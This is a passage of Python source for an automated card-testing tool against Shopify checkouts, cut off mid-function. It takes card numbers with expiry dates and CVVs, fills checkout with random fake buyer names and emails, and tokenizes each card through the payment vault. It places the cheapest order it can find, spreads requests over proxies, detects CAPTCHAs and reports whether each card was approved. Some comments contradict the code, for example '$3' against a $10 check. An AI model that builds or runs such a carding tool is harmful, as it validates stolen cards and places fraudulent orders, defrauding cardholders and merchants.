def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None

def is_captcha_required(response_text):
    if not response_text:
        return False
    
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha'
    ]
    
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=True,
    # 429-specific retry config
    max_429_retries=5,
    base_backoff=1.0,
    max_backoff=60.0,
):
    """
    POST a GraphQL request with:
      - Generic error retry (max_retries)
      - Dedicated 429 / Throttled retry with exponential backoff + jitter (max_429_retries)
    Returns: (response, response_text, captcha_solved)
    """
    response = None
    response_text = ""
    throttle_count = 0

    for attempt in range(max_retries + 1):
        try:
            resp = await session.post(
                graphql_url, params=params, headers=headers, json=json_data
            )
            text = await resp.text()

            # ── 429 / rate-limit handling ────────────────────────────────
            if resp.status == 429 or (
                resp.status == 200 and '"Throttled"' in text
            ):
                if throttle_count >= max_429_retries:
                    # Give up – return what we have so caller can handle it
                    return resp, text, False

                # Honour Retry-After header when present
                retry_after = resp.headers.get("Retry-After") or \
                              resp.headers.get("retry-after")
                if retry_after:
                    try:
                        wait = float(retry_after)
                    except ValueError:
                        wait = base_backoff * (2 ** throttle_count)
                else:
                    # Exponential backoff with ±25 % jitter
                    wait = min(
                        base_backoff * (2 ** throttle_count),
                        max_backoff
                    )
                    wait *= (0.75 + random.random() * 0.5)

                wait = min(wait, max_backoff)
                print(
                    f"[429] throttle #{throttle_count + 1} – "
                    f"waiting {wait:.1f}s before retry"
                )
                await asyncio.sleep(wait)
                throttle_count += 1
                continue        # retry WITHOUT consuming an attempt slot
            # ─────────────────────────────────────────────────────────────

            return resp, text, False

        except Exception as e:
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1)

    return response, response_text, False

async def fetch_products(domain, proxy_str=None):
    """
    Fetch products and find the cheapest product under $3
    Returns: product info dict or (False, error_message)
    """
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                if resp.status != 200:
                    return False, f"<b>Site Error! Status: {resp.status}</b>"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not Shopify!</b>"

                result = (await resp.json())['products']
                if not result:
                    return False, "<b>No Products!</b>"

        # ============ FIX: Only find products under $3 ============
        min_price = float('inf')
        min_product = None
        cheap_products = []

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    # ============ FIX: Only consider products under $3 ============
                    if price < 10.00:  # <-- CHANGED: Only products under $3
                        cheap_products.append({
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        })
                        
                        if price < min_price:
                            min_price = price
                            min_product = {
                                'site': domain,
                                'price': f"{price:.2f}",
                                'variant_id': str(variant['id']),
                                'link': f"{domain}/products/{product['handle']}"
                            }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        # ============ FIX: Check if any cheap products found ============
        if min_product and min_price < 10.00:
            return min_product
        elif cheap_products:
            # If we have cheap products but min_product wasn't set (shouldn't happen)
            return cheap_products[0]
        else:
            return False, "<b>No products under $10 ound!</b>"

    except aiohttp.ClientError as e:
        return False, f"<b>Proxy Error: {str(e)}</b>"
    except Exception as e:
        return False, f"error: {str(e)}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]


# ─────────────────────────────────────────────────────────────────────────────
# Site-level context cache
# Everything that is the same for EVERY card on the same site:
#   • cheapest variant / price
#   • checkout session token (SST) + related tokens
#   • shipping strategy + amounts
#   • payment identifier / gateway name
# We cache one "warm" context per site and refresh it when it expires or errors.
# ─────────────────────────────────────────────────────────────────────────────

import dataclasses
from typing import Optional

@dataclasses.dataclass
class SiteContext:
    # product
    variant_id: str
    product_price: str
    # checkout page values
    sst: str
    attempt_token: str
    queue_token: str
    stable_id: str
    merch: str
    currency: str
    subtotal: str
    checkout_url: str
    graphql_url: str
    # address (same for all cards on a site)
    address_info: dict
    first_name: str
    last_name: str
    email: str
    # shipping outcome
    delivery_strategy: str
    shipping_amount: float
    tax_amount: float
    running_total: str
    # payment
    payment_identifier: str
    gateway: str
    # headers to reuse (without card-specific parts)
    base_headers: dict
    # misc
    ident_sig: Optional[str]
    checkpoint_data: Optional[str]
    # expiry: refresh context after this many seconds
    expires_at: float = dataclasses.field(default_factory=lambda: time.time() + 120)

    def is_valid(self) -> bool:
        return time.time() < self.expires_at


class SiteContextCache:
    """
    Per-site cache of the expensive, reusable checkout context.
    Thread-safe via asyncio.Lock so concurrent coroutines don't all
    build the context at the same time (only one builds; others wait).
    """
    def __init__(self):
        self._cache: dict[str, SiteContext] = {}
        self._locks: dict[str, asyncio.Lock] = {}

    def _lock_for(self, site: str) -> asyncio.Lock:
        if site not in self._locks:
            self._locks[site] = asyncio.Lock()
        return self._locks[site]

    async def get_or_build(self, site: str, proxy_str=None) -> SiteContext:
        lock = self._lock_for(site)
        async with lock:
            ctx = self._cache.get(site)
            if ctx and ctx.is_valid():
                return ctx
            # Build fresh context
            ctx = await _build_site_context(site, proxy_str)
            self._cache[site] = ctx
            return ctx

    def invalidate(self, site: str):
        self._cache.pop(site, None)


_SITE_CACHE = SiteContextCache()


async def _build_site_context(site_url: str, proxy_str=None) -> SiteContext:
    """
    Does everything that is IDENTICAL for all cards on this site:
      cart add → checkout page → shipping negotiation → delivery negotiation.
    Returns a populated SiteContext ready for per-card use.
    Raises on any fatal error so the caller can propagate it.
    """
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy = parse_proxy(proxy_str) if proxy_str else None

    # ── 1. Product lookup ────────────────────────────────────────────────────
    info = await fetch_products(ourl, proxy_str)
    if isinstance(info, tuple) and info[0] is False:
        raise RuntimeError(info[1])
    variant_id = info['variant_id']
    product_price = info['price']

    # ── 2. Address / names ───────────────────────────────────────────────────
    address_info = pick_addr(ourl)
    country_code = address_info["countryCode"]
    firstName, lastName = Utils.get_random_name()
    email = Utils.generate_email(firstName, lastName)
    phone   = address_info["phone"]
    street  = address_info["address1"]
    city    = address_info["city"]
    state   = address_info["zoneCode"]
    s_zip   = address_info["postalCode"]
    address2 = ""

    base_headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': ourl,
        'Referer': ourl,
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout   = aiohttp.ClientTimeout(total=30)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        cart_url = ourl + '/cart/add.js'
        checkout_url_path = ourl + '/checkout/'

        # ── 3. Cart ─────────────────────────────────────────────────────────
        cart_headers = {**base_headers, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json, text/javascript'}
        cart_resp = await session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
        if cart_resp.status != 200:
            cart_headers_alt = {**base_headers, 'Content-Type': 'application/json', 'Accept': 'application/json'}
            cart_resp = await session.post(cart_url, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, headers=cart_headers_alt, proxy=proxy)
        if cart_resp.status != 200:
            raise RuntimeError(f"Cart failed: {cart_resp.status}")

        # ── 4. Checkout page ─────────────────────────────────────────────────
        checkout_headers = {**base_headers, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1'}
        response = await session.post(url=checkout_url_path, allow_redirects=True, headers=checkout_headers, proxy=proxy)
        checkout_url = str(response.url)

        if 'login' in checkout_url.lower():
            raise RuntimeError("Site requires login!")

        attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
        attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

        sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
        text = await response.text()
        if not sst:
            sst = (extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;') or
                   extract_between(text, 'name="serialized-sessionToken" content="', '"') or
                   extract_between(text, '"serializedSessionToken":"', '"') or
                   extract_between(text, 'data-session-token="', '"') or
                   extract_between(text, '"sessionToken":"', '"'))
        if not sst:
            raise RuntimeError("Failed to get session token")

        queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
        stable_id  = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
        merch = (extract_between(text, 'ProductVariantMerchandise/', '&quot;') or
                 extract_between(text, 'ProductVariantMerchandise/', '&q') or
                 extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                 str(variant_id))

        currency = 'USD'
        if 'currencyCode&quot;:&quot;' in text:
            currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
        elif '"currencyCode":"' in text:
            currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

        subtotal = (extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or
                    extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
        if not subtotal:
            pm = re.search(r'"price":\s*"([\d.]+)"', text)
            subtotal = pm.group(1) if pm else "0.01"

        unescaped = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
        build_id = None
        bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
        if bm:
            build_id = bm.group(1)

        source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
        if source_token:
            source_token = source_token.replace('&quot;', '').strip('"')

        ident_sig = None
        im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
        if im:
            ident_sig = im.group(1)

        graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

        # Build full headers for GraphQL
        headers = {**base_headers,
                   'shopify-checkout-client': 'checkout-web/1.0',
                   'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                   'x-checkout-one-session-token': sst,
                   'sec-fetch-dest': 'empty',
                   'sec-fetch-mode': 'cors',
                   'sec-fetch-site': 'same-origin'}
        if build_id:
            headers.update({'x-checkout-web-build-id': build_id, 'x-checkout-web-deploy-stage': 'production', 'x-checkout-web-server-handling': 'fast', 'x-checkout-web-server-rendering': 'yes'})
        if source_token:
            headers['x-checkout-web-source-id'] = source_token

        # ── 5. Shipping proposal ─────────────────────────────────────────────
        shipping_json = {
            'query': QUERY_PROPOSAL_SHIPPING,
            'variables': {
                'sessionInput': {'sessionToken': sst},
                'queueToken': queue_token or '',
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {'deliveryLines': [{'destination': {'partialStreetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True},
                'deliveryExpectations': {'deliveryExpectationLines': []},
                'merchandise': {'merchandiseLines': [{'stableId': stable_id or '1', 'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{merch}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}}, 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}}, 'lineComponentsSource': None, 'lineComponents': []}]},
                'payment': {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': country_code, 'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
                'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': country_code}, 'email': email, 'emailChanged': False, 'phoneCountryCode': country_code, 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False},
                'tip': {'tipLines': []},
                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                'note': {'message': None, 'customAttributes': []},
                'localizationExtension': {'fields': []},
                'nonNegotiableTerms': None,
                'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
                'optionalDuties': {'buyerRefusesDuties': False}
            },
            'operationName': 'Proposal'
        }

        for _ in range(2):
            resp, resp_text, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, {'operationName': 'Proposal'}, headers, shipping_json, checkout_url, max_retries=1)
            await asyncio.sleep(3)

        if not resp:
            raise RuntimeError(f"Shipping request failed: {resp_text}")
        if is_captcha_required(resp_text):
            raise RuntimeError("CAPTCHA_REQUIRED")

        try:
            rj = json.loads(resp_text)
        except json.JSONDecodeError as e:
            raise RuntimeError(f"Invalid JSON (shipping): {e}")

        if 'errors' in rj:
            msgs = [e.get('message', str(e)) for e in rj.get('errors', [])[:3]]
            raise RuntimeError(f"GraphQL Error: {'; '.join(msgs)}")

        session_data = rj.get('data', {}).get('session')
        negotiate    = session_data.get('negotiate') if session_data else None
        result       = negotiate.get('result') if negotiate else None
        if not result:
            raise RuntimeError("No negotiation result")

        rt = result.get('__typename', '')
        if rt == 'CheckpointDenied':
            raise RuntimeError("Checkpoint Denied")
        if rt == 'Throttled':
            raise RuntimeError("Throttled")
        if rt == 'NegotiationResultFailed':
            raise RuntimeError("Negotiation failed")

        checkpoint_data = result.get('checkpointData')
        seller_proposal = result.get('sellerProposal')
        if not seller_proposal:
            raise RuntimeError("No seller proposal")

        running_total_data = seller_proposal.get('runningTotal')
        if not running_total_data:
            raise RuntimeError("No runningTotal")
        running_total = running_total_data['value']['amount']

        delivery_data = seller_proposal.get('delivery', {})
        delivery_type = delivery_data.get('__typename', '')
        delivery_strategy = ''
        shipping_amount   = 0.0
        if delivery_type == 'FilledDeliveryTerms':
            dl = delivery_data.get('deliveryLines', [{}])
            if dl:
                avail = dl[0].get('availableDeliveryStrategies', [])
                if avail:
                    delivery_strategy = avail[0].get('handle', '')
                    try:
                        shipping_amount = float(avail[0].get('amount', {}).get('value', {}).get('amount', '0'))
                    except:
                        shipping_amount = 0.0

        tax_amount = 0.0
        try:
            tax_data = seller_proposal.get('tax', {})
            if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                tax_amount = float(tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
        except:
            pass

        payment_identifier = ''
        gateway = 'UNKNOWN'
        payment_data = seller_proposal.get('payment', {})
        if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
            for method in payment_data.get('availablePaymentLines', []):
                pm = method.get('paymentMethod', {})
                if pm.get('name') or pm.get('paymentMethodIdentifier'):
                    payment_identifier = pm.get('paymentMethodIdentifier', '')
                    gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
                    break

        if not payment_identifier:
            raise RuntimeError("No valid payment method found")

        total_price = str(float(running_total) + shipping_amount + tax_amount)

        return SiteContext(
            variant_id=variant_id, product_price=product_price,
            sst=sst, attempt_token=attempt_token,
            queue_token=queue_token or '', stable_id=stable_id or '1',
            merch=merch, currency=currency, subtotal=subtotal,
            checkout_url=checkout_url, graphql_url=graphql_url,
            address_info=address_info, first_name=firstName, last_name=lastName, email=email,
            delivery_strategy=delivery_strategy, shipping_amount=shipping_amount,
            tax_amount=tax_amount, running_total=running_total,
            payment_identifier=payment_identifier, gateway=gateway,
            base_headers=headers, ident_sig=ident_sig,
            checkpoint_data=checkpoint_data,
            expires_at=time.time() + 90,   # reuse context for 90 seconds
        )


async def process_card_with_retry(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, max_retries=3):
    """
    Process card with retry logic for "No products under $3"
    Tries different sites if one doesn't have products under $3
    """
    tried_sites = set()
    last_error = None
    
    for attempt in range(max_retries):
        # Get a new site for each attempt (if not provided)
        current_site = site_url
        current_variant = variant_id
        
        # If this is a retry, try a different site
        if attempt > 0:
            # Try to get a different site from rotation
            # You would need to implement site rotation logic here
            # For now, we'll use the same site but this should be improved
            pass
        
        # Process the card
        result = await process_card(cc, mes, ano, cvv, current_site, current_variant, proxy_str)
        
        # Check if it's the "No products under $3" error
        if isinstance(result, tuple) and len(result) >= 2:
            success = result[0]
            message = result[1]
            
            if not success and "No products under $3" in str(message):
                print(f"⚠️ Attempt {attempt + 1}: {message} - Retrying...")
                last_error = message
                # Add current site to tried sites
                tried_sites.add(current_site)
                continue
            
            # Success or different error - return result
            return result
        
        # If result is not a tuple or unexpected, return it
        return result
    
    # All retries failed
    return False, f"No sites with products under $3 found after {max_retries} attempts", "UNKNOWN", "0.00", "USD"

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    """
    Per-card work only: vault card → submit → poll.
    Everything else (product lookup, checkout session, shipping) is pulled
    from the SiteContext cache so it is only done ONCE per site, not once per card.
    """
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy = parse_proxy(proxy_str) if proxy_str else None
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    try:
        # ── Get (or build) reusable site context ────────────────────────────
        try:
            ctx = await _SITE_CACHE.get_or_build(ourl, proxy_str)
        except RuntimeError as e:
            return False, str(e), gateway, total_price, currency

        gateway      = ctx.gateway
        currency     = ctx.currency
        total_price  = str(float(ctx.running_total) + ctx.shipping_amount + ctx.tax_amount)

        # Use overridden variant_id if caller passed one
        vid     = variant_id or ctx.variant_id
        address = ctx.address_info
        country_code = address["countryCode"]
        phone   = address["phone"]
        street  = address["address1"]
        city    = address["city"]
        state   = address["zoneCode"]
        s_zip   = address["postalCode"]
        address2 = ""

        # Each card gets fresh personal details (name / email) for uniqueness
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)

        headers = dict(ctx.base_headers)   # shallow copy – safe to mutate

        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

            # ── 1. Vault card ────────────────────────────────────────────────
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(ctx.currency and mes),   # mes comes from caller
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(ourl).netloc
            }
            # Fix: mes is a plain string – the `and` trick above is wrong; reassign properly
            payload["credit_card"]["month"] = int(mes)

            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ctx.ident_sig:
                vault_headers['shopify-identification-signature'] = ctx.ident_sig

            vault_resp = await session.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                json=payload, headers=vault_headers, proxy=proxy
            )
            try:
                token_data = await vault_resp.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Unable to get payment token', gateway, total_price, currency
            except Exception as e:
                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency

            # ── 2. Submit ────────────────────────────────────────────────────
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': ctx.sst},
                    'queueToken': ctx.queue_token,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}},
                            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': ctx.delivery_strategy or '', 'customDeliveryRate': False}, 'options': {'phone': phone}},
                            'targetMerchandiseLines': {'lines': [{'stableId': ctx.stable_id}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': str(ctx.shipping_amount), 'currencyCode': currency}},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': ctx.stable_id,
                            'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{ctx.merch}', 'variantId': f'gid://shopify/ProductVariant/{vid}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': ctx.subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': ctx.payment_identifier, 'sessionId': token, 'billingAddress': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}, 'cardSource': None}},
                            'amount': {'value': {'amount': ctx.running_total, 'currencyCode': currency}},
                            'dueAt': None
                        }],
                        'billingAddress': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}
                    },
                    'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': country_code}, 'email': email, 'emailChanged': False, 'phoneCountryCode': country_code, 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': country_code}, 'rememberMe': False},
                    'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': str(ctx.tax_amount), 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': ctx.attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': ctx.checkout_url}
            }
            if ctx.checkpoint_data:
                submit_variables['input']['checkpointData'] = ctx.checkpoint_data

            submit_json = {'query': MUTATION_SUBMIT, 'variables': submit_variables, 'operationName': 'SubmitForCompletion'}

            response, text, _ = await make_graphql_request_with_captcha_handling(
                session, ctx.graphql_url, {'operationName': 'SubmitForCompletion'}, headers, submit_json, ctx.checkout_url, max_retries=1
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if "Your order total has changed." in text:
                _SITE_CACHE.invalidate(ourl)   # force context refresh
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                _SITE_CACHE.invalidate(ourl)
                return False, "Payment method not available", gateway, total_price, currency

            try:
                resp_json  = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency

            if not submit_data:
                errors = resp_json.get('errors', [])
                if errors:
                    for err in errors:
                        code = err.get('code')
                        if code:
                            return False, code, gateway, total_price, currency
                return False, "Empty submit response", gateway, total_price, currency

            result_type = submit_data.get('__typename', '')

            if result_type in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                if receipt.get('__typename') == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", gateway, total_price, currency
                rid = receipt.get('id')
            elif result_type == 'SubmitFailed':
                reason = submit_data.get('reason', 'Unknown reason')
                return False, extract_clean_response(reason), gateway, total_price, currency
            elif result_type == 'SubmitRejected':
                errors = submit_data.get('errors', [])
                if errors:
                    for err in errors:
                        code = err.get('code', '')
                        detail = err.get('localizedMessage', '') or err.get('nonLocalizedMessage', '')
                        if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and detail:
                            return False, detail, gateway, total_price, currency
                        if code:
                            return False, code, gateway, total_price, currency
                return False, "Submit Rejected", gateway, total_price, currency
            elif result_type == 'Throttled':
                poll_after = submit_data.get('pollAfter', 3)
                try:
                    wait_sec = min(float(poll_after), 60.0)
                except:
                    wait_sec = 3.0
                await asyncio.sleep(wait_sec)
                return False, "Throttled", gateway, total_price, currency
            else:
                rid = (submit_data.get('receipt') or {}).get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency

            # ── 3. Poll ──────────────────────────────────────────────────────
            poll_json = {'query': QUERY_POLL, 'variables': {'receiptId': rid, 'sessionToken': ctx.sst}, 'operationName': 'PollForReceipt'}

            await asyncio.sleep(3)

            final_text = ""
            for _ in range(4):
                response, final_text, _ = await make_graphql_request_with_captcha_handling(
                    session, ctx.graphql_url, {'operationName': 'PollForReceipt'}, headers, poll_json, ctx.checkout_url, max_retries=1
                )

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    pj = json.loads(final_text)
                    receipt_data = pj.get('data', {}).get('receipt', {})
                    if receipt_data:
                        tn = receipt_data.get('__typename', '')
                        if tn == 'ProcessedReceipt':
